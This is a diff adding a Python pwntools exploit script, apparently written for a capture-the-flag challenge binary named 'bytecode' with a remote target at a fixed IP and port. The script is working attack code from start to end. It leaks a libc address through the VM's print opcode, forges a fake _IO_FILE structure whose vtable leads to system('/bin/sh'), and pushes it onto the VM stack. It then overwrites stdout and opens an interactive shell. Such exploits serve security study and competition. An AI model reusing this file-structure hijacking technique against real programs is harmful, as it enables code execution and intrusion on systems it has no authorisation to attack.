@@ -1,0 +1,94 @@
+#!/usr/bin/env python3
+from pwn import *
+import need
+
+exe = ELF("./bytecode")
+libc = ELF("/usr/lib64/libc.so.6")
+ld = ELF("/usr/lib64/ld-linux-x86-64.so.2")
+# context.log_level='debug'
+context.terminal = ["foot"]
+if args.REMOTE:
+    p = remote("172.210.129.230", 1350)
+else:
+    p = process([exe.path])
+    gdb.attach(p, """"
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+def btoa(buffer, element_size=8):
+  elements = []
+  for i in range(0, len(buffer), element_size):
+    elements.append(buffer[i:i + element_size])
+  return elements
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+same=b"a"*8
+data = b""
+add = p8(0)#+b"a"*8
+sub = p8(1)#+b"a"*8
+div = p8(2)#+b"a"*8
+mul = p8(3)#+b"a"*8
+ands = p8(4)#+b"a"*8
+xor = p8(5)#+b"a"*8
+ors = p8(6)#+b"a"*8
+push = p8(7)#+8
+pop = p8(8)
+prt = p8(9)#+data
+puts = p8(10)#+b"a"*4
+dec = p8(11)#+b"a"*4
+inc = p8(12)#+b"a"*4
+lea = p8(13)#+16
+nop = p8(14)
+halt = p8(15)
+
+payload = puts+p32(0x404020)
+log.info(f"puts {hex(0x404020)}")
+sla(b">>",payload)
+p.recvuntil(b" ")
+leakaddr = u64(p.recvuntil(b"\n",drop=True).ljust(8,b"\0"))
+libc.address = leakaddr - libc.sym._IO_2_1_stdout_
+system_libc = libc.sym.system
+bin_sh = libc.search(b"/bin/sh").__next__()
+log.info(f"leaklibc: {hex(leakaddr)}")
+log.info(f"base: {hex(libc.address)}")
+log.info(f"bin_sh: {hex(bin_sh)}")
+log.info(f"system: {hex(system_libc)}")
+#########################################start forging
+fake_vtable2 = libc.address+0x1e13c8
+new = need._IO_FILE()
+new._wide_data = exe.sym.stack+400
+new._flags = 0x733b0810
+new.hole1 = 0x68
+new._lock = libc.address + 0x1e4710
+new._unused2 = 0x6161616161616161616161616161616161616161
+new.vtable = fake_vtable2-0x20
+payload = new.create()+p64(u64(b"/bin/sh\0"))+b"the end of the forge"
+payload += b"a"*(400-len(payload))+ p64(libc.sym.system)
+payload += b"a"*(408-len(payload))+ b"b"*8
+payload += b"a"*(424-len(payload))+ p64(0x20)
+payload += b"a"*(432-len(payload))+ p64(0x30)
+payload += b"a"*(448-len(payload))+ b"a"
+payload += b"a"*(624-len(payload))+ p64(0x4041d8)
+new.structure()
+array = btoa(payload)
+################################################## end forging
+for i in range(len(array)):
+    payload = push+array[len(array)-i-1]
+    log.info(f"push {array[len(array)-i-1]}")
+    sla(b">>",payload)
+# overwrite stdout with forging _IO_FILE
+# payload = lea+p64(exe.sym.stdout)+p64(exe.sym.stack)
+payload = prt+p64(exe.sym.stack)
+sla(b">>",payload)
+payload = lea+p64(exe.sym.stdout)+p64(exe.sym.stack)
+sla(b">>",payload)
+
+
+p.interactive()
+# good luck pwning :)
+
